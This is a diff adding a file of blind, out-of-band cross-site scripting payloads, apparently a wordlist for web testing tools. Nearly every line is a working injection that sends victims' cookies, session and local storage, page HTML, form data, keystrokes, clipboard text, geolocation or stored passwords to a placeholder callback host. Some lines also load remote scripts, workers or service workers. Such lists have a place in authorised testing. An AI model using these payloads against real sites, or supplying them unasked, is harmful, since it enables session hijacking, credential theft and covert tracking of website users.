@@ -1,0 +1,218 @@
+# Blind/Out-of-Band XSS Payloads
+# These payloads exfiltrate data or signal detection via external requests
+# Replace {{CALLBACK}} with your actual callback domain
+
+# Basic callback using script src
+<script src=//{{CALLBACK}}></script>
+<script src=http://{{CALLBACK}}/xss></script>
+<script src=https://{{CALLBACK}}/xss></script>
+
+# Image-based callbacks
+<img src=//{{CALLBACK}}>
+<img src=//{{CALLBACK}}/xss>
+<img src=http://{{CALLBACK}}/xss>
+<img src=https://{{CALLBACK}}/xss>
+
+# With document cookie exfiltration
+<script>fetch('//{{CALLBACK}}?c='+document.cookie)</script>
+<script>new Image().src='//{{CALLBACK}}?c='+document.cookie</script>
+<img src=x onerror=this.src='//{{CALLBACK}}?c='+document.cookie>
+<img src=x onerror=fetch('//{{CALLBACK}}?c='+document.cookie)>
+
+# With document domain
+<script>fetch('//{{CALLBACK}}?d='+document.domain)</script>
+<script>new Image().src='//{{CALLBACK}}?d='+document.domain</script>
+
+# With full URL
+<script>fetch('//{{CALLBACK}}?u='+encodeURIComponent(location.href))</script>
+<script>new Image().src='//{{CALLBACK}}?u='+encodeURIComponent(location.href)</script>
+
+# With full HTML content
+<script>fetch('//{{CALLBACK}}',{method:'POST',body:document.documentElement.innerHTML})</script>
+<script>fetch('//{{CALLBACK}}?h='+btoa(document.documentElement.innerHTML))</script>
+
+# With localStorage
+<script>fetch('//{{CALLBACK}}?l='+JSON.stringify(localStorage))</script>
+<script>new Image().src='//{{CALLBACK}}?l='+encodeURIComponent(JSON.stringify(localStorage))</script>
+
+# With sessionStorage
+<script>fetch('//{{CALLBACK}}?s='+JSON.stringify(sessionStorage))</script>
+
+# XMLHttpRequest-based
+<script>x=new XMLHttpRequest();x.open('GET','//{{CALLBACK}}?c='+document.cookie);x.send()</script>
+<script>x=new XMLHttpRequest();x.open('POST','//{{CALLBACK}}');x.send(document.cookie)</script>
+
+# Fetch API with POST
+<script>fetch('//{{CALLBACK}}',{method:'POST',body:document.cookie})</script>
+<script>fetch('//{{CALLBACK}}',{method:'POST',body:new FormData(document.forms[0])})</script>
+
+# WebSocket-based
+<script>new WebSocket('wss://{{CALLBACK}}/?'+document.cookie)</script>
+<script>w=new WebSocket('wss://{{CALLBACK}}');w.onopen=()=>w.send(document.cookie)</script>
+
+# DNS-based (using arbitrary subdomain)
+<img src=//x.{{CALLBACK}}>
+<script src=//c${btoa(document.cookie)}.{{CALLBACK}}></script>
+<img src=//${document.cookie}.{{CALLBACK}}>
+
+# Link prefetch
+<link rel=prefetch href=//{{CALLBACK}}?c=${document.cookie}>
+<link rel=dns-prefetch href=//{{CALLBACK}}>
+
+# iframe-based
+<iframe src=//{{CALLBACK}}?c=${document.cookie}></iframe>
+<iframe src=javascript:parent.location='//{{CALLBACK}}?c='+document.cookie></iframe>
+
+# Object/embed tags
+<object data=//{{CALLBACK}}?c=${document.cookie}></object>
+<embed src=//{{CALLBACK}}?c=${document.cookie}>
+
+# Video/audio callbacks
+<video src=//{{CALLBACK}}></video>
+<audio src=//{{CALLBACK}}></audio>
+
+# SVG-based
+<svg><image href=//{{CALLBACK}}></svg>
+<svg><use href=//{{CALLBACK}}#x></svg>
+<svg><script href=//{{CALLBACK}}></script></svg>
+
+# Using navigator.sendBeacon
+<script>navigator.sendBeacon('//{{CALLBACK}}',document.cookie)</script>
+<script>navigator.sendBeacon('//{{CALLBACK}}',JSON.stringify({cookie:document.cookie,url:location.href}))</script>
+
+# Using import()
+<script>import('//{{CALLBACK}}/xss.js')</script>
+
+# Service worker
+<script>navigator.serviceWorker.register('//{{CALLBACK}}/sw.js')</script>
+
+# Form submission
+<form action=//{{CALLBACK}} method=post><input name=cookie></form><script>document.forms[0].cookie.value=document.cookie;document.forms[0].submit()</script>
+
+# Meta refresh
+<meta http-equiv=refresh content='0;url=//{{CALLBACK}}?c='+document.cookie>
+
+# Using window.open
+<script>window.open('//{{CALLBACK}}?c='+document.cookie)</script>
+<script>open('//{{CALLBACK}}?c='+document.cookie)</script>
+
+# With setInterval for persistent callback
+<script>setInterval(()=>fetch('//{{CALLBACK}}?c='+document.cookie),5000)</script>
+<script>setInterval(()=>new Image().src='//{{CALLBACK}}/ping?'+Date.now(),10000)</script>
+
+# Keystroke logger
+<script>document.onkeypress=e=>fetch('//{{CALLBACK}}?k='+e.key)</script>
+<script>document.addEventListener('keydown',e=>new Image().src='//{{CALLBACK}}?k='+e.key)</script>
+
+# Mouse tracking
+<script>document.onmousemove=e=>fetch('//{{CALLBACK}}?x='+e.clientX+'&y='+e.clientY)</script>
+
+# Form hijacking
+<script>document.forms[0].onsubmit=()=>{fetch('//{{CALLBACK}}',{method:'POST',body:new FormData(document.forms[0])});return true}</script>
+
+# Click tracking
+<script>document.onclick=e=>fetch('//{{CALLBACK}}?click='+e.target.tagName)</script>
+
+# Scroll tracking
+<script>window.onscroll=()=>fetch('//{{CALLBACK}}?scroll='+window.scrollY)</script>
+
+# Clipboard stealing
+<script>document.oncopy=e=>fetch('//{{CALLBACK}}?clip='+window.getSelection())</script>
+<script>navigator.clipboard.readText().then(t=>fetch('//{{CALLBACK}}?clip='+t))</script>
+
+# Geolocation exfiltration
+<script>navigator.geolocation.getCurrentPosition(p=>fetch('//{{CALLBACK}}?lat='+p.coords.latitude+'&lon='+p.coords.longitude))</script>
+
+# Camera/microphone access
+<script>navigator.mediaDevices.getUserMedia({video:true}).then(s=>fetch('//{{CALLBACK}}?cam=1'))</script>
+
+# Battery API
+<script>navigator.getBattery().then(b=>fetch('//{{CALLBACK}}?battery='+b.level))</script>
+
+# Network information
+<script>fetch('//{{CALLBACK}}?net='+navigator.connection.effectiveType)</script>
+
+# Screen resolution
+<script>fetch('//{{CALLBACK}}?res='+screen.width+'x'+screen.height)</script>
+
+# Browser fingerprinting
+<script>fetch('//{{CALLBACK}}?fp='+btoa(navigator.userAgent))</script>
+
+# Plugin enumeration
+<script>fetch('//{{CALLBACK}}?plugins='+Array.from(navigator.plugins).map(p=>p.name).join(','))</script>
+
+# All cookies from all domains (if accessible)
+<script>document.domain.split('.').forEach((d,i,a)=>{document.domain=a.slice(i).join('.');fetch('//{{CALLBACK}}?d='+document.domain+'&c='+document.cookie)})</script>
+
+# Exfiltrate all inputs
+<script>fetch('//{{CALLBACK}}?inputs='+Array.from(document.querySelectorAll('input')).map(i=>i.name+'='+i.value).join('&'))</script>
+
+# Exfiltrate all links
+<script>fetch('//{{CALLBACK}}?links='+Array.from(document.links).map(l=>l.href).join(','))</script>
+
+# Using EventSource (Server-Sent Events)
+<script>new EventSource('//{{CALLBACK}}?c='+document.cookie)</script>
+
+# Using document.write to inject callback
+<script>document.write('<img src=//{{CALLBACK}}?c='+document.cookie+'>')</script>
+
+# Using CSS to exfiltrate
+<style>@import '//{{CALLBACK}}/style.css';</style>
+<style>body{background:url('//{{CALLBACK}}?c='+document.cookie)}</style>
+
+# Link rel=preload
+<link rel=preload href=//{{CALLBACK}}/resource as=script>
+
+# Using ping attribute
+<a ping=//{{CALLBACK}}>click</a>
+
+# HTML5 drag events
+<div draggable=true ondragstart=fetch('//{{CALLBACK}}?drag=1')>Drag me</div>
+
+# Mutation observer
+<script>new MutationObserver(()=>fetch('//{{CALLBACK}}/mutation')).observe(document,{childList:true,subtree:true})</script>
+
+# Performance API
+<script>fetch('//{{CALLBACK}}?timing='+JSON.stringify(performance.timing))</script>
+
+# Credential Management API
+<script>navigator.credentials.get({password:true}).then(c=>fetch('//{{CALLBACK}}?cred='+c))</script>
+
+# IndexedDB exfiltration
+<script>indexedDB.databases().then(dbs=>fetch('//{{CALLBACK}}?idb='+JSON.stringify(dbs)))</script>
+
+# Web Workers
+<script>new Worker('//{{CALLBACK}}/worker.js')</script>
+
+# Using requestIdleCallback
+<script>requestIdleCallback(()=>fetch('//{{CALLBACK}}/idle'))</script>
+
+# Using requestAnimationFrame
+<script>requestAnimationFrame(()=>fetch('//{{CALLBACK}}/frame'))</script>
+
+# Intersection Observer
+<script>new IntersectionObserver(()=>fetch('//{{CALLBACK}}/visible')).observe(document.body)</script>
+
+# Minimal blind XSS
+<script src=//{{CALLBACK}}></script>
+<img src=//{{CALLBACK}}>
+<script>fetch('//{{CALLBACK}}?c='+document.cookie)</script>
+<script>new Image().src='//{{CALLBACK}}?c='+document.cookie</script>
+
+# With error handling
+<script>try{fetch('//{{CALLBACK}}?c='+document.cookie)}catch(e){new Image().src='//{{CALLBACK}}?err='+e}</script>
+
+# Polyglot blind XSS
+'"><script src=//{{CALLBACK}}></script>
+'"><img src=//{{CALLBACK}}>
+';fetch('//{{CALLBACK}}?c='+document.cookie);//
+";new Image().src='//{{CALLBACK}}?c='+document.cookie;//
+
+# Using alternative protocols
+<script>location='javascript:fetch("//{{CALLBACK}}?c="+document.cookie)'</script>
+
+# Using setTimeout for delayed callback
+<script>setTimeout(()=>fetch('//{{CALLBACK}}?c='+document.cookie),1000)</script>
+
+# Multiple callbacks for redundancy
+<script>fetch('//{{CALLBACK}}?c='+document.cookie);new Image().src='//{{CALLBACK}}/img?c='+document.cookie</script>
